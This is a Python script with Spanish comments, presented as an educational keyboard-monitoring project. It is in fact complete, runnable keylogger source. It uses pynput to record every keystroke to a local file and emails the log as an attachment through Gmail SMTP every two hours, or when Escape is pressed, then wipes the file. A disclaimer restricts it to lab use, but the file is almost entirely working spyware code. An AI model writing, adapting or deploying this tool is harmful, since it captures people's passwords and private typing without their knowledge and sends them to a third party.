"""
Keyboard Monitoring Script (proyecto educativo)

Este script fue desarrollado con fines formativos para comprender cómo funcionan
las técnicas de monitorización de teclado (keylogging) y estudiar mecanismos de 
automatización en ciberseguridad ofensiva.

⚠️ No debe usarse fuera de un entorno de laboratorio controlado. Su uso en sistemas
ajenos sin consentimiento es ilegal y contrario a la ética profesional.
⚠️ El autor no se hace responsable de su uso indebido.

⚠️ Este script no es un keylogger completo, sino una versión simplificada para fines
educativos. No incluye técnicas avanzadas de ocultación, persistencia o evasión de
detección.


Código
"""
import os
import time, threading
import smtplib
import logging
from email.message import EmailMessage
from pynput.keyboard import Key,Listener

# Variables globales
last_time = 0
last_key = None
log_file = "pulsaciones_grabadas.txt"
DEBOUNCE_TIME = 0.05

# Teclas modificadoras a ignorar
IGNORED_KEYS = {
    Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_r,
    Key.alt, Key.alt_r, Key.cmd, Key.cmd_r
}

# Teclas especiales que se mostrarán como texto legible
KEY_MAPPINGS = {
    Key.space: " ",
    Key.enter: "\n",
    Key.backspace: "[BACKSPACE]",
    Key.tab: "[TAB]",
    Key.esc: "[ESCAPE]",
    Key.delete: "[DELETE]"
}

# CONFIGURACIÓN - definir por variables de entorno o directamente en entorno de pruebas
EMAIL_ORIGEN = os.getenv("KEYLOGGER_EMAIL", "tucorreo@dominio.com")
EMAIL_DESTINO = os.getenv("KEYLOGGER_DESTINO", "destinatario@dominio.com")
EMAIL_PASSWORD = os.getenv("KEYLOGGER_PASSWORD", "password123")



def periodical_save():
	"""Envía el archivo por correo cada 2 horas (simulado)."""
	threading.Timer(7200, periodical_save).start()
	if os.path.getsize(log_file) > 0:
		send_messages()


def send_messages():
	"""Envía por correo el archivo de pulsaciones."""
	try:
		msg = EmailMessage()
		msg["From"] = EMAIL_ORIGEN
		msg['Subject'] = "Registro de prueba - Keyboard Monitoring"
		msg["To"] = EMAIL_DESTINO
		msg.set_content(f"Log generado el : {time.ctime()}")
		
		with open(log_file, 'r') as file:
			contenido = file.read()
		fecha = time.strftime('%Y%m%d%H%M%S', time.localtime())
		msg.add_attachment(contenido, subtype="plain", filename=f"log_{fecha}.txt")

		with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
			smtp.starttls()
			smtp.login(EMAIL_ORIGEN, EMAIL_PASSWORD)
			smtp.send_message(msg)

		logging.info ("Correo enviado correctamente")
		with open(log_file, 'w') as f:
			f.truncate(0)  # Limpiamos el archivo después de enviar	
	
	except Exception as e:
		logging.error(f"Error enviando el correo:{e}")
    
def on_press(key):
	"""Función que se activa al soltar una tecla."""
	global last_key, last_time
	current_time = time.time()

	#Ignorar repetición de teclas muy rápidas
	if key == last_key and (current_time - last_time) < DEBOUNCE_TIME:
		return
	last_key = key
	last_time = current_time
	
	# Ignorar teclas modificadoras
	if key in IGNORED_KEYS:
		return
	
	try:		
		#Mapeo de telcas especiales
		if key in KEY_MAPPINGS:
			s = KEY_MAPPINGS[key]
		elif hasattr(key, 'char') and key.char is not None:
			s = key.char
		
		else:
			s = f"[{key.name.upper()}]"
		
		with open(log_file, 'a', encoding='utf-8') as f:
			f.write(s)
		
		if key == Key.esc:
			logging.info("Forzar envio")
			send_messages()

	except Exception as e:
		with open(log_file, 'a') as f:
			f.write(" [ERROR / TECLA NO IDENTIFICADA] ")
		logging.warning(f"Excepción capturada: {e}")

#Inicio del programa
if __name__ == "__main__":
	logging.basicConfig(level=logging.INFO)

	with open(log_file, 'w', encoding='utf-8') as f:
		f.truncate(0)  # Limpiamos el archivo al inicio
	

	periodical_save()
	with Listener(on_press=on_press) as listener:
		listener.join()

